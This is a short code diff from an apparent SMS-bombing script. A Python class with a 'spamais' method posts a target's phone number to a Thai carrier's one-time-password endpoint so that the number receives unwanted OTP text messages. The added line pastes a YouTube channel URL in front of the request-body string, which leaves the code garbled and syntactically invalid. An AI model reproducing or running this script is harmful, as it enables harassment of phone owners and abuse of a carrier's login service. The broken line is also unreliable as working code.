@@ -21,7 +21,7 @@ num = int("" + number)
 class SMS():
     def spamais(self,num):
         url = "https://srfng.ais.co.th/login/sendOneTimePW"
-        data = f"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
+        data = https://youtube.com/channel/UCD-2xF1TOAx-SwWVogKeayg"msisdn={num}&serviceId=AISPlay&accountType=all&otpChannel=sms"
         headers = {
                     "Host": "srfng.ais.co.th",
                     "Connection": "keep-alive",
